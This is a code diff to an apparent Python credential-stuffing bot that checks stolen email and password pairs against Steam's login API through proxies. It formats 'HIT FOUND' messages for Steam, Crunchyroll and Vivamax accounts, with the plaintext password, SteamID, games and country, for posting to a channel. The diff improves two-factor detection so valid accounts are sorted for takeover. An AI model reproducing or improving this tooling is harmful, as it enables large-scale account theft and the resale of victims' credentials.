@@ -1233,22 +1233,28 @@ Try another account!
     if mode == "Steam":
         if result.get('twofa'):
             text = f"""
-✅ <b>Steam Hit!</b>
+✅ <b>STEAM HIT FOUND!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
-SteamID: <code>{result.get('steamid','N/A')}</code>
+🆔 SteamID: <code>{result.get('steamid','N/A')}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
 🔐 <b>2FA Required</b>
-"""
+📝 This account is valid but needs 2FA code to login.
+🌍 <b>Country:</b> {result.get('country', 'Unknown')}
+━━━━━━━━━━━━━━━━━━━━━━━━
+Channel: {CHANNEL_USERNAME}
+            """.strip()
+
         else:
             text = f"""
-✅ <b>Steam Hit!</b>
+✅ <b>STEAM HIT FOUND!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
-SteamID: <code>{result.get('steamid','N/A')}</code>
+🆔 SteamID: <code>{result.get('steamid','N/A')}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
 """
-
         # Games section with Family View note
         if result.get('games_count') is not None:
             if result['games_count'] == 0:
@@ -1261,11 +1267,15 @@ SteamID: <code>{result.get('steamid','N/A')}</code>
             
             if result.get('games'):
                 text += "\n🔥 <b>Top Games:</b>"
-                for game in result['games'][:8]:
+                for game in result['games'][:10]:
                     text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
 
-        text += f"\n🌍 <b>Country:</b> {result.get('country', 'Unknown')}"
-        return text.strip()
+        text += f"""
+🌍 <b>Country:</b> {result.get('country', 'Unknown')}
+━━━━━━━━━━━━━━━━━━━━━━━━
+Channel: {CHANNEL_USERNAME}"
+        """.strip()
+        return text
 
     if mode == "Vivamax":
         # === RICH VIVAMAX FORMAT (same style as your standalone script) ===
@@ -1292,7 +1302,7 @@ Channel: {CHANNEL_USERNAME}
     else:
         # === ORIGINAL CRUNCHYROLL TIERED FORMAT ===
         base = f"""
-✅ <b>HIT FOUND!</b>
+✅ <b>CRUNCHYROLL HIT FOUND!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
@@ -1379,7 +1389,7 @@ def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str
     return base64.b64encode(hex_bytes).decode('ascii')
 
 def check_steam(username: str, password: str, proxy=None) -> dict:
-    """Improved Steam Checker - Rich data + Family View bypass + better 2FA handling"""
+    """Improved Steam Checker - Much better 2FA detection"""
     result = {
         'email': username,
         'password': password,
@@ -1392,10 +1402,9 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         'country': 'Unknown',
         'vac_banned': False,
         'limited': False,
-        # Game fields
         'games_count': 0,
         'total_playtime': 0,
-        'games': []               # top games for display
+        'games': []
     }
 
     try:
@@ -1403,7 +1412,7 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         if proxy:
             session.proxies = {'http': proxy, 'https': proxy}
 
-        # ====================== 1. RSA Public Key ======================
+        # 1. Get RSA Key
         rsa_req = CAuthentication_GetPasswordRSAPublicKey_Request()
         rsa_req.account_name = username
         rsa_bytes = rsa_req.SerializeToString()
@@ -1424,13 +1433,13 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         exponent_hex = rsa_resp.publickey_exp.strip()
         timestamp = rsa_resp.timestamp
 
-        # ====================== 2. Encrypt Password ======================
+        # 2. Encrypt password
         encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)
         if not encrypted_b64:
             result['message'] = "RSA encryption failed"
             return result
 
-        # ====================== 3. Begin Auth Session ======================
+        # 3. Begin Auth Session
         auth_req = CAuthentication_BeginAuthSessionViaCredentials_Request()
         auth_req.account_name = username
         auth_req.device_friendly_name = ""
@@ -1462,13 +1471,15 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         resp = session.post(url_auth, headers=headers, data=multipart_data, timeout=25)
 
         x_eresult = resp.headers.get('X-eresult')
-
-        if x_eresult == '5':
-            result['message'] = "Invalid username or password"
-        elif x_eresult == '15':
+        # ==================== IMPROVED 2FA DETECTION ====================
+        if x_eresult in ['15', '85'] or "twofactor" in resp.text.lower() or "emailcode" in resp.text.lower():
             result['twofa'] = True
             result['success'] = True
             result['message'] = "2FA Required"
+            return result
+
+        elif x_eresult == '5':
+            result['message'] = "Invalid username or password"
         elif x_eresult == '6':
             result['message'] = "Account not found"
         elif len(resp.content) > 7:
